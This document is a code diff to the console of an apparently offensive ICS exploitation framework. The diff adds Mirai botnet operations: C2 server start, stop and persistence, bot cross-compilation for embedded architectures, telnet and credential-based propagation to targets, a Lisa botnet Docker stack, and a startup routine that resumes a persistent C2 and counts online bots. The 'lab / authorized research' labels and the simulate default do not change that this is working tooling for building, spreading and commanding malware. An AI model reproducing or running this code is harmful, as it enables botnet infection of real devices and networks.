@@ -9,6 +9,11 @@ Prompt: "ixf >" (global) / "ixf (Module Name) >" (module loaded)
 
 import os
 import shlex
+import sys
+
+from industrialxpl.core.platform import require_linux
+
+require_linux()
 
 try:
     import readline  # Unix/Mac readline support
@@ -21,7 +26,6 @@ except ModuleNotFoundError:
         readline = None  # type: ignore[assignment]
         _HAS_READLINE = False
 import subprocess
-import sys
 from pathlib import Path
 from typing import Optional
 
@@ -36,7 +40,7 @@ from industrialxpl.core.exploit.utils import (
     module_required, MODULES_DIR,
 )
 
-VERSION = "1.0.46"
+VERSION = "1.0.52"
 
 _BANNER = r"""
  ___           _           _        _       ___  ______  _          _____
@@ -371,9 +375,34 @@ class IXFInterpreter(BaseInterpreter):
 
     def __init__(self) -> None:
         super().__init__()
+        try:
+            from industrialxpl.core.malware.crosscompile import ensure_cross_path_in_env
+            ensure_cross_path_in_env()
+        except Exception:
+            pass
         print_status("Indexing modules…")
         self.modules: list = index_modules()
         print_success("{} modules indexed.".format(len(self.modules)))
+        self._resume_persistent_c2()
+
+    def _resume_persistent_c2(self) -> None:
+        """If C2_PERSIST / saved state — show bots reporting after IXF restart."""
+        try:
+            from industrialxpl.core.malware.c2_server import resume_on_startup
+            r = resume_on_startup()
+            if not r.get("resumed"):
+                return
+            online = r.get("bots_online", 0)
+            total = r.get("bots_total", 0)
+            pid = r.get("daemon_pid", "—")
+            cfg = r.get("config") or {}
+            print_info(
+                "C2 persistente — {} bots online / {} total | py={} go={}".format(
+                    online, total, pid, r.get("go_cnc_pid", "—"),
+                )
+            )
+        except Exception:
+            pass
 
     # -- Global commands ----------------------------------------------------
 
@@ -2124,6 +2153,7 @@ Example:
 Malware commands (lab / authorized research):
 
   malware list              List incorporated malware families
+  malware matrix            Capability matrix (mode, compile, IXF route)
   malware analyze <slug>    Deep-dive vendor source + attack vectors
   malware plan <slug>       Build orchestration plan for family
   malware build <target>    Compile with setg LHOST / LPORT (C2 lab profile)
@@ -2133,11 +2163,19 @@ Malware commands (lab / authorized research):
   malware deploy <path> <ip> [port]  Deploy to lab target
   malware shell <ip> [port] One-shot shell/session probe
   malware firmware <img> <ip>  Firmware replace (gated)
+  malware c2 start|stop|status|build-go   Go Mirai CNC (SQLite/MySQL/Postgres)
+  malware crosscompile list|all|<arch>    Cross-build Mirai bots (mips/arm/...)
+  malware crosscompile install            Download uClibc toolchains (lab)
+  malware propagate <target>              Scan + arch-aware deploy (telnet/creds)
+  malware docker lisa up|down|status      Lisa botnet Docker stack (lab)
 
-Globals: setg LHOST <ip>  setg LPORT <port>  setg OBFUSCATE true  setg STEALTH true
+Globals: setg LHOST <ip>  setg LPORT <port>  setg C2_PERSIST true
+         setg C2_BACKEND auto|go|python     setg C2_DSN sqlite://...
+         setg LAB_WHITELIST <cidr|ip,...>  setg OBFUSCATE true  setg STEALTH true
 
 Modules:
   use scanners/malware_research/malware_full_pipeline
+  use scanners/malware_research/botnet_c2_ops
   use scanners/ics_tools_research/ics_tools_ops
 """)
             return
@@ -2146,6 +2184,19 @@ Modules:
             catalog = MalwareCatalog()
             rows = [(s, catalog.get(s).label if catalog.get(s) else s) for s in catalog.list_slugs()]
             print_table(["Slug", "Family"], rows, title="Incorporated Malware Families")
+            return
+
+        if sub == "matrix":
+            from industrialxpl.core.malware.family_capabilities import capability_matrix
+            rows = [
+                (r["slug"], r["mode"], r["compile"], r["ixf_module"])
+                for r in capability_matrix()
+            ]
+            print_table(
+                ["Slug", "Mode", "Compile", "IXF module"],
+                rows,
+                title="Malware Family Matrix",
+            )
             return
 
         if sub == "analyze" and len(parts) >= 2:
@@ -2158,6 +2209,11 @@ Modules:
             print_success("{} — {} source files, {} ELF".format(
                 info["family"], info["source_files"], len(info.get("elf_binaries", []))
             ))
+            if info.get("capability_mode"):
+                print_info("Mode: {} | Compile: {}".format(
+                    info["capability_mode"],
+                    ", ".join(info.get("compile_targets", [])) or "—",
+                ))
             if info.get("attack_vectors"):
                 print_info("Vectors: {}".format(", ".join(info["attack_vectors"][:12])))
             if info.get("ixf_module"):
@@ -2228,6 +2284,167 @@ Modules:
                 print_info("  - {}".format(step))
             return
 
+        if sub == "c2":
+            from industrialxpl.core.malware.c2_server import MiraiC2Manager
+            from industrialxpl.core.malware.crosscompile import RELEASE_DIR
+            action = (parts[1].lower() if len(parts) >= 2 else "status")
+            lhost = str(self.global_variables.get("LHOST", "0.0.0.0") or "0.0.0.0")
+            lport = int(self.global_variables.get("LPORT", 48101) or 48101)
+            persist = str(self.global_variables.get("C2_PERSIST", "true")).lower() in ("1", "true", "yes")
+            backend = str(self.global_variables.get("C2_BACKEND", "auto"))
+            dsn = str(self.global_variables.get("C2_DSN", ""))
+            mgr = MiraiC2Manager()
+            if action == "build-go":
+                from industrialxpl.core.malware.go_cnc_manager import build_go_cnc
+                from industrialxpl.core.malware.db_init import init_schema, default_dsn
+                r = build_go_cnc()
+                if r.get("success"):
+                    print_success("Go CNC: {} ({} bytes)".format(r.get("output"), r.get("size", 0)))
+                    ir = init_schema(dsn or default_dsn())
+                    print_info("DB schema: {}".format(ir.get("dialect", ir.get("error", ""))))
+                else:
+                    print_error(r.get("error", "build failed"))
+                return
+            if action == "start":
+                artifact = ""
+                release_dir = str(RELEASE_DIR) if RELEASE_DIR.is_dir() else ""
+                if len(parts) >= 3:
+                    artifact = parts[2]
+                elif self.global_variables.get("MALWARE_ARTIFACT"):
+                    artifact = str(self.global_variables.get("MALWARE_ARTIFACT"))
+                else:
+                    profile = BuildProfile(lhost=lhost, lport=lport)
+                    if profile.effective_cnc_host():
+                        from industrialxpl.core.malware.crosscompile import MiraiCrossCompiler
+                        xr = MiraiCrossCompiler().compile_all(profile)
+                        if xr.get("built"):
+                            release_dir = xr.get("release_dir", "")
+                            artifact = xr["built"][0].get("path", "")
+                            print_success("Cross-compile: {} artefatos em {}".format(
+                                len(xr["built"]), release_dir))
+                        else:
+                            br = MalwareCompiler().compile("mirai_bot_debug", profile=profile)
+                            if br.get("success"):
+                                artifact = br.get("output", "")
+                                print_success("Bot host: {}".format(artifact))
+                r = mgr.start(
+                    lhost=lhost, lport=lport, persist=persist, artifact=artifact,
+                    background=persist, cnc_backend=backend, cnc_dsn=dsn,
+                    release_dir=release_dir,
+                )
+                print_success("C2 {}:{} — mode={} pid={} go={}".format(
+                    lhost, lport, r.get("mode"), r.get("pid", "—"), r.get("go_cnc_pid", r.get("pid"))))
+            elif action == "stop":
+                mgr.stop()
+                print_success("C2 encerrado (Go + Python)")
+            elif action == "status":
+                st = mgr.status()
+                print_info("Python daemon: {} | Go CNC: {} | bots {}/{}".format(
+                    st.get("daemon_pid"), st.get("go_cnc_pid"),
+                    st.get("bots_online"), st.get("bots_total")))
+                rows = [
+                    (b["bot_ip"], b["status"], b.get("deploy_method", ""), int(b.get("last_seen", 0)))
+                    for b in st.get("bots", [])
+                ]
+                if rows:
+                    print_table(["Bot IP", "Status", "Deploy", "Last seen"], rows, title="Botnet C2")
+            else:
+                print_error("Usage: malware c2 start|stop|status|build-go")
+            return
+
+        if sub == "docker" and len(parts) >= 2:
+            stack = parts[1].lower()
+            action = (parts[2].lower() if len(parts) >= 3 else "status")
+            if stack != "lisa":
+                print_error("Unknown stack: {} (lisa)".format(stack))
+                return
+            from industrialxpl.core.lab.docker_stack import DockerStackManager
+            mgr = DockerStackManager()
+            if action == "up":
+                r = mgr.up(build=True)
+                if r.get("success"):
+                    print_success("Lisa stack starting — {}".format(r.get("url")))
+                    w = mgr.wait_http()
+                    print_success("HTTP ready") if w.get("success") else print_warning(w.get("error"))
+                else:
+                    print_error(r.get("error") or r.get("stderr", "")[:200])
+            elif action == "down":
+                r = mgr.down()
+                print_success("Lisa stack stopped") if r.get("success") else print_error(r.get("error", "failed"))
+            else:
+                r = mgr.status()
+                print_info(r.get("stdout", r.get("error", ""))[:1500])
+            return
+
+        if sub == "crosscompile":
+            from industrialxpl.core.malware.crosscompile import MiraiCrossCompiler, ensure_cross_path_in_env
+            action = (parts[1].lower() if len(parts) >= 2 else "list")
+            if action == "install":
+                script = Path(__file__).resolve().parents[2] / "tools" / "install-mirai-toolchains.sh"
+                if not script.is_file():
+                    print_error("install-mirai-toolchains.sh missing")
+                    return
+                import subprocess
+                r = subprocess.run(["bash", str(script)], cwd=str(script.parent.parent))
+                ensure_cross_path_in_env()
+                print_success("Toolchains installed") if r.returncode == 0 else print_error("Install failed")
+                return
+            xc = MiraiCrossCompiler()
+            profile = BuildProfile(
+                lhost=str(self.global_variables.get("LHOST", "")),
+                lport=int(self.global_variables.get("LPORT", 0) or 0),
+            )
+            if action == "list":
+                rows = [(t.prefix, "yes" if t.available else "no") for t in xc.detect_toolchains()]
+                print_table(["Toolchain", "Available"], rows, title="Mirai Cross-Compilers")
+                arts = xc.list_artifacts()
+                if arts:
+                    print_info("{} artefatos em {}".format(len(arts), xc.list_artifacts()[0].get("path", "")))
+                return
+            arches = parts[2:] if action not in ("all", "go-cnc") and len(parts) > 2 else None
+            if action == "go-cnc":
+                r = xc.build_go_cnc()
+            elif action == "all":
+                r = xc.compile_all(profile)
+            else:
+                r = xc.compile_all(profile, arches=[action] + (arches or []))
+            if r.get("success"):
+                for b in r.get("built", []):
+                    print_success("{} → {}".format(b.get("arch"), b.get("path", b.get("file"))))
+                if r.get("skipped"):
+                    print_warning("{} toolchains ausentes".format(len(r["skipped"])))
+            else:
+                print_error(r.get("error", "crosscompile failed")[:200])
+            return
+
+        if sub == "propagate" and len(parts) >= 2:
+            from industrialxpl.core.malware.propagator import BotnetPropagator
+            from industrialxpl.core.malware.crosscompile import RELEASE_DIR
+            target = parts[1]
+            lhost = str(self.global_variables.get("LHOST", "127.0.0.1") or "127.0.0.1")
+            lport = int(self.global_variables.get("LPORT", 48101) or 48101)
+            wl = str(self.global_variables.get("LAB_WHITELIST", ""))
+            artifact = str(self.global_variables.get("MALWARE_ARTIFACT", ""))
+            simulate = str(self.global_variables.get("SIMULATE", "true")).lower() in ("1", "true", "yes")
+            if not simulate and not DestructiveGate.require_confirmation(
+                "malware propagate", target, "CRITICAL",
+                "Propagar botnet em {} -> C2 {}:{}".format(target, lhost, lport),
+            ):
+                return
+            prop = BotnetPropagator(
+                lhost, lport, artifact_path=artifact, lab_whitelist=wl,
+                release_dir=str(RELEASE_DIR) if RELEASE_DIR.is_dir() else "",
+            )
+            r = prop.propagate(target, simulate=simulate)
+            if r.get("simulate"):
+                print_warning("[SIMULATE] Abertos: {} hosts".format(r.get("open_services")))
+                print_info("Alvos: {}".format(", ".join(r.get("would_deploy_to", [])[:12])))
+            else:
+                print_success("Deploy em {} hosts".format(len(r.get("deployed", []))))
+                for h, u, m in r.get("deployed", [])[:15]:
+                    print_info("  {} ({}, {})".format(h, u, m))
+            return
+
         if sub == "compile":
             compiler = MalwareCompiler()
             compiler.refresh()
@@ -2270,6 +2487,7 @@ Modules:
 ICS-tools commands (incorporated vendor integration):
 
   ics_tools list                 List tools (SCADAPASS, Redpoint, SIXNET, ISF, ...)
+  ics_tools matrix               Native vs vendor entry matrix
   ics_tools analyze <slug>       Vendor inventory + entry script
   ics_tools plan <slug>          Orchestration plan
   ics_tools run <slug> [args...] Run vendor entry (add setg TARGET for NSE/sixnet)
@@ -2290,6 +2508,14 @@ Examples:
         if sub == "list":
             rows = [(s, IcsToolsCatalog().get(s).label) for s in orch.list_tools()]
             print_table(["Slug", "Label"], rows, title="ICS-Tools")
+            return
+
+        if sub == "matrix":
+            rows = []
+            for slug in orch.list_tools():
+                fam = IcsToolsCatalog().get(slug)
+                rows.append((slug, fam.interpreter if fam else "", fam.entry_script if fam else "", "IXF native"))
+            print_table(["Slug", "Interp", "Entry", "Runtime"], rows, title="ICS-Tools Matrix")
             return
 
         if sub == "analyze" and len(parts) >= 2:
